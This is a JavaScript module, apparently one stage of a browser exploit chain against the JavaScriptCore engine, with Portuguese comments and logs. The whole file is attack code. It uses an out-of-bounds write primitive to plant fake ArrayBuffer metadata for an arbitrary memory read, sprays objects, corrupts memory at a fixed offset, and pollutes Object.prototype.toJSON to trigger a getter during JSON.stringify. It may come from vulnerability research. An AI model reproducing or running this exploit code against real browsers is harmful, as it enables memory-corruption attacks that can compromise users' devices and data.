// js/script3/testGetterTriggerAndFakeABRead.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer principal
    oob_write_absolute,
    oob_read_absolute,     // Para verificar a construção do fake AB
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_ON_MYCOMPLEX_NAME = "AAAA_GetterRepro";
let getter_on_mycomplex_called_flag = false;
let getter_on_mycomplex_leak_results = {};

class MyComplexObjectForGetter {
    constructor(id) {
        this.id = `MyComplexObjGetter-${id}`;
        this.marker = 0xFEFEFEFE;
        this.prop1 = "complex_prop1";
        this.prop2 = { nested: "complex_prop2_nested" };
    }
}

// Getter que será definido em MyComplexObjectForGetter.prototype
Object.defineProperty(MyComplexObjectForGetter.prototype, GETTER_ON_MYCOMPLEX_NAME, {
    get: function() {
        const GETTER_FNAME = "MyComplexObjectForGetter.AAAA_GetterRepro";
        getter_on_mycomplex_called_flag = true;
        logS3(`!!!! GETTER '${GETTER_ON_MYCOMPLEX_NAME}' FOI CHAMADO !!!! (this.id: ${this.id})`, "vuln", GETTER_FNAME);
        this.marker = 0xBAADF00D; // Indicar que o getter foi chamado e modificou 'this'

        getter_on_mycomplex_leak_results = {
            getter_called_id: this.id,
            retype_success: false,
            dataview_created: false,
            dataview_byteLength: "N/A",
            leaked_value_hex: "N/A",
            error: null
        };

        try {
            if (!oob_array_buffer_real) {
                throw new Error("oob_array_buffer_real é nulo/undefined dentro do getter.");
            }
            logS3(`   [${GETTER_FNAME}] Tentando criar DataView sobre o 'oob_array_buffer_real' global...`, "info", GETTER_FNAME);
            logS3(`   [${GETTER_FNAME}]   oob_array_buffer_real.byteLength (JS Original) ANTES do new DataView: ${oob_array_buffer_real.byteLength}`, "info", GETTER_FNAME);

            const dv = new DataView(oob_array_buffer_real); // Usa a variável global
            getter_on_mycomplex_leak_results.dataview_created = true;
            getter_on_mycomplex_leak_results.dataview_byteLength = dv.byteLength;
            logS3(`   [${GETTER_FNAME}]   DataView criada sobre oob_array_buffer_real. dv.byteLength (percebido): ${dv.byteLength}`, "info", GETTER_FNAME);

            // Tenta ler do offset 0 do buffer (que deve ser o target_arbitrary_read_address se a re-tipagem funcionou)
            const leaked_val = dv.getUint32(0, true);
            getter_on_mycomplex_leak_results.leaked_value_hex = toHex(leaked_val);
            logS3(`     LEITURA ARBITRÁRIA ESPECULATIVA (via oob_array_buffer_real re-tipado): Conteúdo em offset 0 = ${toHex(leaked_val)}`, "critical", GETTER_FNAME);
            getter_on_mycomplex_leak_results.retype_success = true; // Sucesso se chegou aqui sem erro
            document.title = "SUCCESS: Arbitrary Read via Retyped OOB_AB!";

        } catch (e_dv_retype) {
            logS3(`     ERRO ao tentar usar 'oob_array_buffer_real' re-tipado no getter: ${e_dv_retype.name} - ${e_dv_retype.message}`, "error", GETTER_FNAME);
            getter_on_mycomplex_leak_results.error = `${e_dv_retype.name}: ${e_dv_retype.message}`;
        }
        return "value_from_AAAA_GetterRepro"; // Getter precisa retornar algo
    },
    configurable: true,
    enumerable: true // Crucial para ser pego pelo for...in
});

// toJSON que usa for...in, para ser colocada em Object.prototype
export function toJSON_ForInTrigger() {
    const FNAME_toJSON = "toJSON_ForInTrigger";
    let returned_payload = {
        _variant_: FNAME_toJSON,
        _id_at_entry_: String(this?.id || "N/A_toJSON"),
        props_found: []
    };
    let iter_count = 0;
    try {
        for (const prop in this) {
            iter_count++;
            if (iter_count <= 15) { // Limita o log de propriedades
                 // Acessar this[prop] é o que pode acionar o getter se 'prop' for o nome do getter
                returned_payload.props_found.push(prop);
                 // Para evitar recursão infinita se o getter retornar 'this' ou algo complexo,
                 // não adicionamos this[prop] diretamente ao payload aqui se não for necessário para o trigger.
                 // O próprio acesso this[prop] pelo JSON.stringify (se ele decidir serializar essa prop)
                 // ou pelo loop for...in é o que importa.
            }
            if (iter_count > 200) { // Safety break
                 returned_payload.props_found.push("... (max iterations reached)");
                 break;
            }
        }
    } catch (e) {
        returned_payload.error_in_loop = `${e.name}: ${e.message}`;
    }
    returned_payload.iterations = iter_count;
    return returned_payload;
}


export async function executeGetterTriggerAndFakeABReadTest() {
    const FNAME_TEST = "executeGetterTriggerAndFakeABReadTest";
    logS3(`--- Iniciando Teste: Acionamento de Getter e Leitura via Fake AB "Re-tipado" ---`, "test", FNAME_TEST);
    document.title = `Getter & FakeAB Read Attempt`;

    // Validações de Config
    if (!JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== 2) {
        logS3(`ERRO CRÍTICO: JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID não é 2 em config.mjs.`, "error", FNAME_TEST); return;
    }
    const required_ab_offsets = [
        "STRUCTURE_POINTER_OFFSET", // Da JSCell, usado para zerar
        "SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START",
        "DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START"
    ];
    for (const offset_name of required_ab_offsets) {
        if (JSC_OFFSETS.ArrayBuffer[offset_name] === undefined && JSC_OFFSETS.JSCell[offset_name] === undefined ) {
             logS3(`ERRO CRÍTICO: Offset ${offset_name} não definido em config.mjs.`, "error", FNAME_TEST); return;
        }
    }

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST); return;
    }

    // 1. Construir "Metadados Sombra" no início do CONTEÚDO do oob_array_buffer_real
    const SHADOW_AB_OFFSET_IN_OOB_CONTENT = 0x0; // Escreveremos no início do conteúdo.
                                                 // Este NÃO é o fake_JSArrayBuffer_offset_in_oob = 0x300 dos testes anteriores.
                                                 // A ideia é tentar re-tipar o *próprio* oob_array_buffer_real.

    const shadow_structure_id_val = JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Deve ser 2
    const shadow_structure_ptr_offset_val = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16);
    const shadow_size_offset_val = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const shadow_data_ptr_offset_val = parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, 16);

    const target_arbitrary_read_address = new AdvancedInt64("0x0002000000000000"); // Endereço de teste
    const arbitrary_read_size = 0x200; // Tamanho para a leitura

    logS3(`Escrevendo "Metadados Sombra" para oob_array_buffer_real em seu próprio conteúdo (offset ${toHex(SHADOW_AB_OFFSET_IN_OOB_CONTENT)}):`, "info", FNAME_TEST);
    oob_write_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + 0x0, shadow_structure_id_val, 4); // StructureID
    logS3(`  Shadow StructureID (${toHex(shadow_structure_id_val)}) em +0x0`, "info", FNAME_TEST);
    oob_write_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + shadow_structure_ptr_offset_val, AdvancedInt64.Zero, 8); // Structure*
    logS3(`  Shadow Structure* (zero) em +${toHex(shadow_structure_ptr_offset_val)}`, "info", FNAME_TEST);
    oob_write_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + shadow_size_offset_val, arbitrary_read_size, 4); // Size
    logS3(`  Shadow Size (${toHex(arbitrary_read_size)}) em +${toHex(shadow_size_offset_val)}`, "info", FNAME_TEST);
    oob_write_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + shadow_data_ptr_offset_val, target_arbitrary_read_address, 8); // DataPointer
    logS3(`  Shadow DataPointer (${target_arbitrary_read_address.toString(true)}) em +${toHex(shadow_data_ptr_offset_val)}`, "info", FNAME_TEST);

    // Verificação dos metadados sombra
    const chk_sid = oob_read_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + 0x0, 4);
    const chk_sptr = oob_read_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + shadow_structure_ptr_offset_val, 8);
    const chk_size = oob_read_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + shadow_size_offset_val, 4);
    const chk_dptr = oob_read_absolute(SHADOW_AB_OFFSET_IN_OOB_CONTENT + shadow_data_ptr_offset_val, 8);
    if (chk_sid === shadow_structure_id_val && isAdvancedInt64Object(chk_sptr) && chk_sptr.equals(AdvancedInt64.Zero) &&
        chk_size === arbitrary_read_size && isAdvancedInt64Object(chk_dptr) && chk_dptr.equals(target_arbitrary_read_address)) {
        logS3("  Metadados Sombra para oob_array_buffer_real parecem escritos corretamente em seu conteúdo.", "good", FNAME_TEST);
    } else {
        logS3("  AVISO: Discrepância na verificação dos Metadados Sombra para oob_array_buffer_real.", "warn", FNAME_TEST);
    }

    // 2. Pulverizar MyComplexObjectForGetter
    const spray_count = 50;
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectForGetter...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForGetter(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // 3. Realizar a corrupção OOB "gatilho"
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const corruption_value_trigger = 0xFFFFFFFF;
    logS3(`3. Escrevendo valor trigger ${toHex(corruption_value_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, corruption_value_trigger, 4);

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // 4. Poluir Object.prototype.toJSON e tentar acionar
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;

    getter_on_mycomplex_called_flag = false; // Resetar flag do getter
    getter_on_mycomplex_leak_results = {};   // Resetar resultados do getter

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ForInTrigger, // A toJSON que usa for...in
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_ForInTrigger.name}.`, "info", FNAME_TEST);

        logS3(`5. Sondando os primeiros MyComplexObjectForGetter pulverizados...`, "test", FNAME_TEST);
        const objectsToProbe = Math.min(sprayed_objects.length, 5);
        for (let i = 0; i < objectsToProbe; i++) {
            const obj_to_probe = sprayed_objects[i];
            logS3(`   Testando objeto ${i} (ID: ${obj_to_probe.id})...`, 'info', FNAME_TEST);
            document.title = `Sondando MyComplexObj ${i} (Getter&FakeAB)`;
            try {
                const stringifyResult = JSON.stringify(obj_to_probe);
                logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON_ForInTrigger: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
                if (getter_on_mycomplex_called_flag) {
                    logS3(`     !!!! GETTER FOI ACIONADO NO OBJETO ${i} (ID: ${getter_on_mycomplex_leak_results.getter_called_id}) !!!!`, "vuln", FNAME_TEST);
                    logS3(`     Resultados da tentativa de leitura no getter: ${JSON.stringify(getter_on_mycomplex_leak_results, null, 2)}`, "leak", FNAME_TEST);
                    if (getter_on_mycomplex_leak_results.retype_success) {
                        problem_detected = true; // Sucesso na leitura!
                        document.title = `SUCCESS: Getter + FakeAB Read OK!`;
                    }
                    break; // Parar após o primeiro acionamento do getter
                }
            } catch (e_str) {
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
                problem_detected = true;
                document.title = `ERROR Stringify MyComplexObj ${i}`;
                break;
            }
        }
    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!getter_on_mycomplex_called_flag && !problem_detected) {
        logS3("Getter não foi acionado nos objetos testados.", "warn", FNAME_TEST);
    } else if (!getter_on_mycomplex_leak_results.retype_success && !problem_detected) {
        logS3("Getter foi acionado, mas a leitura arbitrária via oob_array_buffer_real re-tipado falhou ou não foi confirmada.", "warn", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Acionamento de Getter e Leitura via Fake AB "Re-tipado" CONCLUÍDO ---`, "test", FNAME_TEST);
    if (!document.title.includes("SUCCESS") && !document.title.includes("ERROR")) {
        document.title = `Getter & FakeAB Done`;
    }
}
